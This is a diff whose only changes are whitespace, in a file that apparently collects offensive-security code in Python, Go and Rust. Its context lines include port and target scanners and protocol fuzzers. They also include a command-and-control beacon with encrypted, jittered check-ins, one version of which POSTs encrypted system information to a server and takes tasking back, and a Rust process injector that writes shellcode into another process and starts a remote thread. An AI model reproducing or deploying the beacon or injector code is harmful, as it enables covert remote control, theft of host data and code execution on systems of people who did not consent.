@@ -126,12 +126,12 @@ class Scanner:
     def __init__(self, targets: list[str], concurrency: int = 50):
         self.targets = targets
         self.semaphore = asyncio.Semaphore(concurrency)
-
+    
     async def scan_target(self, target: str) -> list[Finding]:
         async with self.semaphore:
             # Implement scan logic
             pass
-
+    
     async def run(self) -> AsyncIterator[Finding]:
         tasks = [self.scan_target(t) for t in self.targets]
         for coro in asyncio.as_completed(tasks):
@@ -151,17 +151,17 @@ class Beacon:
         self.cipher = Fernet(key)
         self.jitter = jitter
         self.sleep_time = 60
-
+    
     def encrypt(self, data: bytes) -> str:
         return base64.b64encode(self.cipher.encrypt(data)).decode()
-
+    
     def decrypt(self, data: str) -> bytes:
         return self.cipher.decrypt(base64.b64decode(data))
-
+    
     def sleep(self):
         jitter = random.uniform(1 - self.jitter, 1 + self.jitter)
         time.sleep(self.sleep_time * jitter)
-
+    
     def checkin(self) -> dict:
         # POST encrypted system info, receive tasking
         pass
@@ -175,27 +175,27 @@ class ProtocolParser:
     def __init__(self, data: bytes):
         self.data = data
         self.offset = 0
-
+    
     def read_u8(self) -> int:
         val = struct.unpack_from('B', self.data, self.offset)[0]
         self.offset += 1
         return val
-
+    
     def read_u16(self) -> int:
         val = struct.unpack_from('>H', self.data, self.offset)[0]
         self.offset += 2
         return val
-
+    
     def read_u32(self) -> int:
         val = struct.unpack_from('>I', self.data, self.offset)[0]
         self.offset += 4
         return val
-
+    
     def read_bytes(self, n: int) -> bytes:
         val = self.data[self.offset:self.offset + n]
         self.offset += n
         return val
-
+    
     def read_string(self) -> str:
         length = self.read_u16()
         return self.read_bytes(length).decode()
@@ -249,7 +249,7 @@ class CoverageFuzzer:
         self.corpus = self._load_corpus(corpus_dir)
         self.crashes_dir = crashes_dir
         self.coverage = set()
-
+    
     def mutate(self, data: bytes) -> bytes:
         mutations = [
             self._bit_flip,
@@ -260,13 +260,13 @@ class CoverageFuzzer:
         ]
         mutator = random.choice(mutations)
         return mutator(data)
-
+    
     def _bit_flip(self, data: bytes) -> bytes:
         d = bytearray(data)
         pos = random.randint(0, len(d) * 8 - 1)
         d[pos // 8] ^= (1 << (pos % 8))
         return bytes(d)
-
+    
     def _insert_interesting(self, data: bytes) -> bytes:
         interesting = [0, 1, 0x7f, 0x80, 0xff, 0xffff, 0x7fffffff, 0x80000000, 0xffffffff]
         d = bytearray(data)
@@ -274,7 +274,7 @@ class CoverageFuzzer:
         val = random.choice(interesting)
         struct.pack_into('<I', d, pos, val & 0xffffffff)
         return bytes(d)
-
+    
     def run_target(self, input_data: bytes) -> tuple:
         """Returns (exit_code, new_coverage)"""
         proc = subprocess.run(
@@ -354,13 +354,13 @@ func (b *Beacon) CheckIn() (*Task, error) {
     }
     body, _ := json.Marshal(sysinfo)
     enc, _ := b.Encrypt(body)
-
+    
     resp, err := http.Post(b.Server+"/api/beacon",
         "application/octet-stream",
         bytes.NewReader(enc))
     if err != nil { return nil, err }
     defer resp.Body.Close()
-
+    
     respBody, _ := io.ReadAll(resp.Body)
     dec, _ := b.Decrypt(respBody)
     var task Task
@@ -394,16 +394,16 @@ class ProtocolField:
     fmt: str  # struct format
     value: int = 0
     fuzzable: bool = True
-
+    
     @property
     def size(self): return struct.calcsize(self.fmt)
-
+    
     def pack(self): return struct.pack(self.fmt, self.value)
-
+    
     def fuzz(self):
         boundaries = [0, 1, self.max_val - 1, self.max_val, self.max_val // 2]
         return random.choice(boundaries + [random.randint(0, self.max_val)])
-
+    
     @property
     def max_val(self): return (1 << (self.size * 8)) - 1
 
@@ -411,7 +411,7 @@ class ProtocolFuzzer:
     def __init__(self, host, port, fields: list[ProtocolField]):
         self.host, self.port = host, port
         self.fields = fields
-
+    
     def build_packet(self, fuzz_field=None) -> bytes:
         pkt = b''
         for f in self.fields:
@@ -420,7 +420,7 @@ class ProtocolFuzzer:
             else:
                 pkt += f.pack()
         return pkt
-
+    
     def send(self, packet: bytes) -> bytes:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(3)
@@ -430,7 +430,7 @@ class ProtocolFuzzer:
         except: resp = b''
         s.close()
         return resp
-
+    
     def fuzz_all_fields(self, iterations=1000):
         for i in range(iterations):
             field = random.choice([f for f in self.fields if f.fuzzable])
@@ -464,26 +464,26 @@ impl ProcessInjector {
         if handle == 0 { return Err(unsafe { GetLastError() }); }
         Ok(Self { pid, handle })
     }
-
+    
     pub fn inject(&self, shellcode: &[u8]) -> Result<HANDLE, u32> {
         let base = unsafe {
             VirtualAllocEx(self.handle, ptr::null(), shellcode.len(),
                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
         };
         if base.is_null() { return Err(unsafe { GetLastError() }); }
-
+        
         let mut written = 0;
         unsafe {
             WriteProcessMemory(self.handle, base, shellcode.as_ptr() as _,
                 shellcode.len(), &mut written);
-
+            
             let mut old = 0u32;
             VirtualProtectEx(self.handle, base, shellcode.len(),
                 PAGE_EXECUTE_READ, &mut old);
-
+            
             let thread = CreateRemoteThread(self.handle, ptr::null(),
                 0, Some(std::mem::transmute(base)), ptr::null(), 0, ptr::null_mut());
-
+            
             if thread == 0 { return Err(GetLastError()); }
             Ok(thread)
         }
@@ -517,7 +517,7 @@ async def scan_host(host: str, ports: range, concurrency: int = 500) -> AsyncIte
     async def _scan(port):
         async with sem:
             return await scan_port(host, port)
-
+    
     tasks = [asyncio.create_task(_scan(p)) for p in ports]
     for task in asyncio.as_completed(tasks):
         result = await task
